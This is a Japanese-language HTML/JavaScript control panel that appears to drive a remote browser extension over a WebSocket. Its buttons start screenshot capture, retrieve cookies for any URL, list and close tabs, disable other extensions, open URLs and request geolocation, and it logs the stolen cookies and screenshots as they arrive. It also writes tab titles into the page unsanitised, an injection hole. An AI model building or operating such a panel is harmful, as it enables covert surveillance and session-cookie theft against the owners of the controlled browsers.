<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>リモートPC管理ダッシュボード</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; }
    #output { border: 1px solid #ccc; padding: 10px; height: 250px; overflow-y: scroll; background-color: #f8f8f8; white-space: pre-wrap; }
    .section { border: 1px solid #ddd; padding: 10px; margin-bottom: 20px; }
    .item { margin-bottom: 5px; }
  </style>
</head>
<body>
  <h1>リモートPC管理ダッシュボード</h1>
  
  <div class="section">
    <h2>スクリーンショット制御</h2>
    <button id="startScreenshot">スクリーンショット取得開始 (ON)</button>
    <button id="stopScreenshot">スクリーンショット取得停止 (OFF)</button>
  </div>

  <div class="section">
    <h2>指定URLを開く</h2>
    <input type="text" id="urlInput" placeholder="URLを入力" style="width:300px;">
    <select id="openMode">
      <option value="tab">タブで開く</option>
      <option value="window">ウィンドウで開く</option>
    </select>
    <input type="number" id="widthInput" placeholder="幅 (ウィンドウ)" style="width:80px;">
    <input type="number" id="heightInput" placeholder="高さ (ウィンドウ)" style="width:80px;">
    <button id="openURL">開く</button>
  </div>

  <div class="section">
    <h2>ウィンドウ/タブ管理</h2>
    <button id="listWindows">ウィンドウ・タブ一覧取得</button>
    <div id="windowsList"></div>
  </div>

  <div class="section">
    <h2>拡張機能管理</h2>
    <button id="listExtensions">拡張機能一覧取得</button>
    <div id="extensionsList"></div>
  </div>

  <div class="section">
    <h2>位置情報取得</h2>
    <button id="openGeo">位置情報ウィンドウを開く</button>
  </div>

  <div class="section">
    <h2>Cookie取得</h2>
    <input type="text" id="cookieUrl" placeholder="Cookie取得対象のURL" style="width:300px;">
    <button id="getCookies">Cookie取得</button>
  </div>

  <div class="section">
    <h2>ログ出力</h2>
    <pre id="output"></pre>
  </div>

  <script>
    const output = document.getElementById('output');

    // WebSocket接続 (現在のホストと同じポート3000を利用)
    const ws = new WebSocket("ws://" + location.host);

    ws.onopen = () => {
      appendLog("WSサーバに接続しました。");
    };

    ws.onmessage = (event) => {
      let msg;
      try {
        msg = JSON.parse(event.data);
      } catch (e) {
        appendLog("受信データ解析エラー:" + e);
        return;
      }
      if (msg.command === "listWindowsResponse") {
        displayWindows(msg.data);
      } else if (msg.command === "cookiesResponse") {
        appendLog("Cookie情報:\n" + JSON.stringify(msg.data, null, 2));
      } else if (msg.command === "extensionsResponse") {
        displayExtensions(msg.data);
      } else if (msg.command === "screenshot") {
        // スクリーンショット受信例（dataURLの長さを表示）
        appendLog("スクリーンショット受信, 長さ:" + msg.data.length);
      } else {
        appendLog("受信:" + event.data);
      }
    };

    ws.onerror = (error) => {
      appendLog("WSエラー:" + error);
    };

    ws.onclose = () => {
      appendLog("WS接続が切断されました。");
    };

    function appendLog(message) {
      output.textContent += message + "\n";
      output.scrollTop = output.scrollHeight;
    }

    // 各ボタンのイベントハンドラ
    document.getElementById('startScreenshot').addEventListener('click', () => {
      ws.send(JSON.stringify({ command: "startScreenshot" }));
      appendLog("コマンド送信: startScreenshot");
    });

    document.getElementById('stopScreenshot').addEventListener('click', () => {
      ws.send(JSON.stringify({ command: "stopScreenshot" }));
      appendLog("コマンド送信: stopScreenshot");
    });

    document.getElementById('openURL').addEventListener('click', () => {
      const url = document.getElementById('urlInput').value;
      const mode = document.getElementById('openMode').value;
      const width = parseInt(document.getElementById('widthInput').value) || undefined;
      const height = parseInt(document.getElementById('heightInput').value) || undefined;
      ws.send(JSON.stringify({ command: "openURL", data: { url, mode, width, height } }));
      appendLog(`コマンド送信: openURL (${url})`);
    });

    document.getElementById('listWindows').addEventListener('click', () => {
      ws.send(JSON.stringify({ command: "listWindows" }));
      appendLog("コマンド送信: listWindows");
    });

    document.getElementById('listExtensions').addEventListener('click', () => {
      ws.send(JSON.stringify({ command: "getExtensions" }));
      appendLog("コマンド送信: getExtensions");
    });

    document.getElementById('openGeo').addEventListener('click', () => {
      ws.send(JSON.stringify({ command: "openGeo" }));
      appendLog("コマンド送信: openGeo");
    });

    document.getElementById('getCookies').addEventListener('click', () => {
      const url = document.getElementById('cookieUrl').value;
      ws.send(JSON.stringify({ command: "getCookies", data: { url } }));
      appendLog(`コマンド送信: getCookies (${url})`);
    });

    // ウィンドウ・タブ一覧の表示
    function displayWindows(windows) {
      const listDiv = document.getElementById('windowsList');
      listDiv.innerHTML = "";
      windows.forEach(win => {
        const winDiv = document.createElement('div');
        winDiv.style.border = "1px solid #aaa";
        winDiv.style.margin = "5px";
        winDiv.style.padding = "5px";
        winDiv.innerHTML = `<strong>ウィンドウID: ${win.id}</strong> (状態: ${win.state}, フォーカス: ${win.focused})<br>タブ一覧:<br>`;
        win.tabs.forEach(tab => {
          const tabDiv = document.createElement('div');
          tabDiv.style.marginLeft = "20px";
          tabDiv.className = "item";
          tabDiv.innerHTML = `タブID: ${tab.id} | タイトル: ${tab.title} | URL: ${tab.url} 
            <button data-tabid="${tab.id}">閉じる</button>`;
          tabDiv.querySelector("button").addEventListener('click', (e) => {
            const tabId = e.target.getAttribute("data-tabid");
            ws.send(JSON.stringify({ command: "closeTab", data: { tabId: Number(tabId) } }));
            appendLog("コマンド送信: closeTab (" + tabId + ")");
          });
          winDiv.appendChild(tabDiv);
        });
        // ウィンドウサイズ変更フォーム
        const resizeForm = document.createElement('div');
        resizeForm.style.marginLeft = "20px";
        resizeForm.innerHTML = `
          <input type="number" placeholder="幅" id="win-width-${win.id}" style="width:80px;">
          <input type="number" placeholder="高さ" id="win-height-${win.id}" style="width:80px;">
          <button id="resize-${win.id}">ウィンドウリサイズ(${win.id})</button>
        `;
        winDiv.appendChild(resizeForm);
        winDiv.querySelector(`#resize-${win.id}`).addEventListener('click', () => {
          const width = parseInt(document.getElementById(`win-width-${win.id}`).value);
          const height = parseInt(document.getElementById(`win-height-${win.id}`).value);
          if (width && height) {
            ws.send(JSON.stringify({ command: "resizeWindow", data: { windowId: win.id, width, height } }));
            appendLog("コマンド送信: resizeWindow (" + win.id + ")");
          }
        });
        listDiv.appendChild(winDiv);
      });
    }

    // 拡張機能一覧の表示とON/OFF操作
    function displayExtensions(extensions) {
      const extDiv = document.getElementById('extensionsList');
      extDiv.innerHTML = "";
      extensions.forEach(ext => {
        // 除外する自身の拡張機能もリストに含まれる場合があるため、除外するなどの対応も可能です
        const item = document.createElement('div');
        item.className = "item";
        item.style.borderBottom = "1px solid #ccc";
        item.style.padding = "5px";
        item.innerHTML = `ID: ${ext.id} | 名前: ${ext.name} | 状態: ${ext.enabled ? "有効" : "無効"}`;
        const btn = document.createElement('button');
        btn.style.marginLeft = "10px";
        if (ext.enabled) {
          btn.textContent = "無効化";
          btn.addEventListener('click', () => {
            ws.send(JSON.stringify({ command: "disableExtension", data: { id: ext.id } }));
            appendLog("コマンド送信: disableExtension (" + ext.id + ")");
          });
        } else {
          btn.textContent = "有効化";
          btn.addEventListener('click', () => {
            ws.send(JSON.stringify({ command: "enableExtension", data: { id: ext.id } }));
            appendLog("コマンド送信: enableExtension (" + ext.id + ")");
          });
        }
        item.appendChild(btn);
        extDiv.appendChild(item);
      });
    }
  </script>
</body>
</html>